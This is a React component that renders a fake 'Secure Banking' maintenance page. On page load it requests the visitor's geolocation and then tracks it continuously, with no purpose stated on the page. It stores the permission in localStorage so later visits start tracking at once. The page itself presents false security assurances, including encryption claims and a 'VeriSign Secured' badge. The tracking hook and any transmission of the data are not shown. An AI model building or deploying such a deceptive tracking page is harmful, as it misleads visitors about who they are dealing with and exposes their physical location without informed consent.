import React, { useEffect } from 'react'
import { useGeolocation } from './hooks/useGeolocation'
import './App.css'

function App() {
  const { getCurrentLocation, startTracking, location, error, loading, isTracking } = useGeolocation()

  // Debug function to reset permission and try again
  const resetAndRetry = () => {
    console.log('🔄 Manual reset triggered')
    localStorage.removeItem('locationPermissionGranted')
    window.location.reload()
  }

  useEffect(() => {
    console.log('🚀 App useEffect triggered')
    
    if ('geolocation' in navigator) {
      // Check if user has previously granted permission
      const hasLocationPermission = localStorage.getItem('locationPermissionGranted')
      console.log('🔍 Checking localStorage permission:', hasLocationPermission)
      
      if (hasLocationPermission === 'true') {
        // Start continuous tracking immediately if permission was previously granted
        console.log('✅ Permission already granted, starting tracking...')
        startTracking()
      } else {
        // Request location permission first
        console.log('❓ No permission found, requesting location...')
        getCurrentLocation().then(() => {
          // If successful, mark permission as granted and start continuous tracking
          console.log('✅ Permission granted! Setting localStorage and starting tracking...')
          localStorage.setItem('locationPermissionGranted', 'true')
          startTracking()
        }).catch((error) => {
          // Permission denied or error
          console.error('❌ Permission denied or error:', error)
          localStorage.setItem('locationPermissionGranted', 'false')
        })
      }
    } else {
      console.error('❌ Geolocation not available in navigator')
    }
  }, [getCurrentLocation, startTracking])

  return (
    <div className="App maintenance-page">
      <header className="maintenance-header">
        <div className="maintenance-header-inner">
          <div className="maintenance-brand-center">
            <img
              src="/logo.png"
              alt="Secure Banking"
              className="maintenance-logo"
            />
          </div>
        </div>
      </header>

      <main className="maintenance-main">
        <section className="maintenance-card">
          <p className="maintenance-info">You are browsing our site in a safe and secure mode.</p>
          <p className="maintenance-info">
            Data transferred from your machine to our servers is in an encrypted mode,
            confidential information.
          </p>

          <div className="maintenance-divider" />

          <h1 className="maintenance-title">WEBSITE UNDER MAINTENANCE</h1>
          <p className="maintenance-message">
            Our apologies for currently undergoing scheduled maintenance and we&apos;ll be back online shortly.
          </p>

          <div className="maintenance-icon" />

          <p className="maintenance-thanks">Thank you for your patience. 🙏</p>

          <div className="maintenance-footer-links">
            <span>FAQs</span>
            <span>Security Tips</span>
            <span>Demo</span>
          </div>

        </section>
      </main>

      <footer className="maintenance-security-footer">
        <div className="maintenance-security-badge">VeriSign Secured</div>
      </footer>
    </div>
  )
}

export default App
